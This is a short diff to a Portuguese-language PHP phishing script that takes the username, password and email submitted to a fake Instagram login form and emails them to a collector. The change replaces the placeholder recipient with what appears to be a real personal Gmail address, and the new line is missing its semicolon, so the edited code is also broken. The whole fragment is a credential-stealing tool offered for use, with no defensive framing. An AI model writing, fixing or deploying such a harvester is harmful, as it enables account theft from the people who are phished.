@@ -3,7 +3,7 @@
     $password = $_POST['password'];
     $email = $_POST['email'];
 
-    $to = 'sua@email.com';  // Insira seu próprio endereço de e-mail aqui
+    $to = 'matheusmena723@gmail.com'
     $subject = 'Credenciais do Instagram capturadas';
     $body = "Nome de usuário: $username\nSenha: $password\nE-mail: $email";
     $headers = 'From: sua@email.com' . "\r\n" .
